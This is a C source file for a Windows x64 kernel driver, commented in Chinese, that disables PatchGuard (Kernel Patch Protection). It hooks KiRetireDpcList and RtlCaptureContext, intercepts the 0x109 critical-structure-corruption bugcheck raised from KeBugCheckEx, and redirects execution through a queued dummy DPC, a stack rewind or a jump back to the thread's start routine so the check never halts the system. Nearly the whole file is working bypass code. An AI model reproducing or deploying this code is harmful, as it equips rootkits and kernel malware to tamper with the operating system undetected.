#include "struct.h"

ULONG64 GetProcAddress(PSTR funcstr);
PVOID sale_hook(
	IN PVOID hook_addr,
	IN PVOID Proxy_ApiAddress,
	OUT PVOID *Original_ApiAddress,
	OUT PDWORD PatchSize);
VOID sale_unhook(IN PVOID ApiAddress, IN PVOID OriCode, IN ULONG PatchSize);
ULONG pslp_patch_size = 0;		//KiRetireDpcList被修改了N字节
PUCHAR pslp_head_n_byte = NULL;	//KiRetireDpcList的前N字节数组
PVOID ori_pslp = NULL;			//KiRetireDpcList的原函数

ULONG pslp_patch_size1 = 0;		//RtlCaptureContext被修改了N字节
PUCHAR pslp_head_n_byte1 = NULL;	//RtlCaptureContext的前N字节数组
PVOID ori_pslp1 = NULL;			//RtlCaptureContext的原函数


typedef struct _HOOK_CTX
{
	ULONG64 rax;
	ULONG64 rcx;
	ULONG64 rdx;
	ULONG64 rbx;
	ULONG64 rbp;
	ULONG64 rsi;
	ULONG64 rdi;
	ULONG64 r8;
	ULONG64 r9;
	ULONG64 r10;
	ULONG64 r11;
	ULONG64 r12;
	ULONG64 r13;
	ULONG64 r14;
	ULONG64 r15;
	ULONG64 Rflags;
	ULONG64 rsp;
}HOOK_CTX, *PHOOK_CTX;



typedef VOID(*TRtlCaptureContext)(PCONTEXT ContextRecord);

extern VOID AdjustStackCallPointer(
	IN ULONG_PTR NewStackPointer,
	IN PVOID StartAddress,
	IN PVOID Argument);

extern CHAR GetCpuIndex();
extern VOID HookKiRetireDpcList();
extern VOID HookRtlCaptureContext();
extern VOID BackTo1942();
static ULONG g_ThreadContextRoutineOffset = 0;
static ULONG64 g_KeBugCheckExAddress = 0;
static int g_MaxCpu = 0;

KDPC  g_TempDpc[0x100];
ULONG64 g_CpuContextAddress = 0;
ULONG64 g_KiRetireDpcList = 0;

//有2个hook点！
//RtlCaptureContext-->保存ecx等物-->OrgCap-->ProcPatchGuard-->其他
//                      -->ECX==109 ,来自BugCheck-->修复STACK，重新插入空DPC
//                                    -->如果IRQL是PASSIVE,则CallPointer去
//                                    -->不是PASSIVE,则恢复环境-->到KiRetireDpcList重新执行DPC序列
//KiRetireDpcList -->保存环境-->原始-->还原环境
//
//
//
//

//真心刁！
VOID
PgTempDpc(
IN struct _KDPC *Dpc,
IN PVOID DeferredContext,
IN PVOID SystemArgument1,
IN PVOID SystemArgument2
)
{
	return;
}
VOID OnRtlCaptureContext(PHOOK_CTX hookCtx)
{
	ULONG64 Rcx;
	PCONTEXT pCtx = (PCONTEXT)(hookCtx->rcx);
	ULONG64 Rip = *(ULONG64 *)(hookCtx->rsp);
	TRtlCaptureContext OldRtlCaptureContext;
	OldRtlCaptureContext = ori_pslp1;

	OldRtlCaptureContext(pCtx);

	pCtx->Rsp = hookCtx->rsp + 0x08;
	pCtx->Rip = Rip;
	pCtx->Rax = hookCtx->rax;
	pCtx->Rbx = hookCtx->rbx;
	pCtx->Rcx = hookCtx->rcx;
	pCtx->Rdx = hookCtx->rdx;
	pCtx->Rsi = hookCtx->rsi;
	pCtx->Rdi = hookCtx->rdi;
	pCtx->Rbp = hookCtx->rbp;

	pCtx->R8 = hookCtx->r8;
	pCtx->R9 = hookCtx->r9;
	pCtx->R10 = hookCtx->r10;
	pCtx->R11 = hookCtx->r11;
	pCtx->R12 = hookCtx->r12;
	pCtx->R13 = hookCtx->r13;
	pCtx->R14 = hookCtx->r14;
	pCtx->R15 = hookCtx->r15;


	Rcx = *(ULONG64 *)(hookCtx->rsp + 0x48);
	//一开始存储位置rcx=[rsp+8+30]
	//call之后就是[rsp+8+30+8]

	if (Rcx == 0x109)
	{
		//PG的蓝屏！
		if (Rip >= g_KeBugCheckExAddress && Rip <= g_KeBugCheckExAddress + 0x64)
		{

			//来自KeBugCheckEx的蓝屏
			// 先插入一个DPC
			//检测IRQL的级别，如果是DPC_LEVEL的，则传说中的回到过去的技术。
			//如果是普通的，则跳入ThreadContext即可
			PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
			PVOID StartRoutine = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
			PVOID StackPointer = IoGetInitialStack();
			CHAR  Cpu = GetCpuIndex();
			KeInitializeDpc(&g_TempDpc[Cpu],
				PgTempDpc,
				NULL);
			KeSetTargetProcessorDpc(&g_TempDpc[Cpu], (CCHAR)Cpu);
			//KeSetImportanceDpc( &g_TempDpc[Cpu], HighImportance);
			KeInsertQueueDpc(&g_TempDpc[Cpu], NULL, NULL);
			if (1){
				//应该判断版本再做这个事儿！
				PCHAR StackPage = (PCHAR)IoGetInitialStack();

				*(ULONG64 *)StackPage = (((ULONG_PTR)StackPage + 0x1000) & 0x0FFFFFFFFFFFFF000);//stack起始的MagicCode，
				// 如果没有在win7以后的系统上会50蓝屏
			}
			if (KeGetCurrentIrql() != PASSIVE_LEVEL)
			{
				//时光倒流！
				BackTo1942();//回到call KiRetireDpcList去了！
			}
			//线程TIMER的直接执行线程去！
			AdjustStackCallPointer(
				(ULONG_PTR)StackPointer - 0x8,
				StartRoutine,
				NULL);
		}
	}
	return;
}
VOID JmpThreadContext()
{
	PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
	PVOID StartRoutine = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
	PVOID StackPointer = IoGetInitialStack();

	AdjustStackCallPointer(
		(ULONG_PTR)StackPointer - 0x8,
		StartRoutine,
		NULL);
}

VOID DisablePatchProtectionSystemThreadRoutine(
	IN PVOID Nothing)
{
	PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();
	for (g_ThreadContextRoutineOffset = 0;
		g_ThreadContextRoutineOffset < 0x1000;
		g_ThreadContextRoutineOffset += 4)
	{
		if (*(PVOID **)(CurrentThread +
			g_ThreadContextRoutineOffset) == (PVOID)DisablePatchProtectionSystemThreadRoutine)
			break;
	}

	if (g_ThreadContextRoutineOffset < 0x1000)
	{
		g_KeBugCheckExAddress = (ULONG64)GetProcAddress(L"KeBugCheckEx");

		g_MaxCpu = (int)KeNumberProcessors;

		g_CpuContextAddress = (ULONG64)ExAllocatePool(NonPagedPool, 0x200 * g_MaxCpu + 0x1000);

		if (!g_CpuContextAddress)
		{
			return;
		}



		RtlZeroMemory(g_TempDpc, sizeof(KDPC) * 0x100);
		RtlZeroMemory((PVOID)g_CpuContextAddress, 0x200 * g_MaxCpu);


		pslp_head_n_byte = sale_hook(SymbolsInfo.KiRetireDpcList,
			(PVOID)HookKiRetireDpcList,
			&ori_pslp,
			&pslp_patch_size);




		g_KiRetireDpcList = ori_pslp;

	
		pslp_head_n_byte1 = sale_hook((PVOID)GetProcAddress(L"RtlCaptureContext"),
			(PVOID)HookRtlCaptureContext,
			&ori_pslp1,
			&pslp_patch_size1);



	}
}

NTSTATUS DisablePatchProtection() {
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS          Status;
	HANDLE            ThreadHandle = NULL;

	InitializeObjectAttributes(
		&Attributes,
		NULL,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);


	Status = PsCreateSystemThread(
		&ThreadHandle,
		THREAD_ALL_ACCESS,
		&Attributes,
		NULL,
		NULL,
		DisablePatchProtectionSystemThreadRoutine,
		NULL);

	if (ThreadHandle)
		ZwClose(
		ThreadHandle);

	return Status;
}
VOID InitDisablePatchGuard()
{
	DisablePatchProtection();
}
VOID UnLoadDisablePatchGuard(){

	sale_unhook((PVOID)GetProcAddress(L"RtlCaptureContext"), pslp_head_n_byte1, pslp_patch_size1);

	sale_unhook(SymbolsInfo.KiRetireDpcList, pslp_head_n_byte, pslp_patch_size);

	
}